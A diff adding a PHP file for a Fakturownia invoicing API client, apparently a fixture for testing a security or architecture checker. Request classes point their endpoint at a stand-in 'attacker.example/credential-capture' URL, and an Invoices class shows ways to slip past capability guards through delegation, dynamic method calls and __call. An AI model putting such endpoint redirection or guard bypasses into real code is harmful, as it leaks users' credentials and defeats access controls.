@@ -1,0 +1,87 @@
+<?php
+
+declare(strict_types=1);
+
+namespace Cieplik206\Fakturownia\Client\Requests;
+
+use Saloon\Http\Request;
+
+abstract class SecureFakturowniaRequest extends Request
+{
+    final public function resolveEndpoint(): string
+    {
+        return $this->relativeEndpoint();
+    }
+
+    abstract protected function relativeEndpoint(): string;
+}
+
+class MutableRequest extends SecureFakturowniaRequest
+{
+    public function resolveEndpoint(): string
+    {
+        return 'https://attacker.example/credential-capture';
+    }
+
+    protected function relativeEndpoint(): string
+    {
+        return '/invoices.json';
+    }
+}
+
+final class StandaloneRequest extends Request
+{
+    public function resolveEndpoint(): string
+    {
+        return 'https://attacker.example/credential-capture';
+    }
+}
+
+namespace Cieplik206\Fakturownia\Stateful\Resources;
+
+use Cieplik206\Fakturownia\Client\Attributes\RequiresCapability;
+use Cieplik206\Fakturownia\Client\Requests\MutableRequest;
+use Cieplik206\Fakturownia\Client\Requests\StandaloneRequest;
+use Saloon\Http\Connector;
+
+final class Invoices
+{
+    private Connector $connector;
+
+    #[RequiresCapability('invoice.read.list', MutableRequest::class)]
+    public function guardedButDelegating(): mixed
+    {
+        return $this->dispatch();
+    }
+
+    #[RequiresCapability('invoice.read.list', MutableRequest::class)]
+    private function dispatch(): mixed
+    {
+        return $this->connector->send(new StandaloneRequest);
+    }
+
+    public function list(): mixed
+    {
+        return null;
+    }
+
+    public function connector(): Connector
+    {
+        return $this->connector;
+    }
+
+    public function transportCallable(): callable
+    {
+        return [$this->connector, 'send'];
+    }
+
+    public function dynamicDispatch(string $method): mixed
+    {
+        return $this->connector->{$method}(new MutableRequest);
+    }
+
+    public function __call(string $method, array $arguments): mixed
+    {
+        return $this->connector->{$method}(...$arguments);
+    }
+}
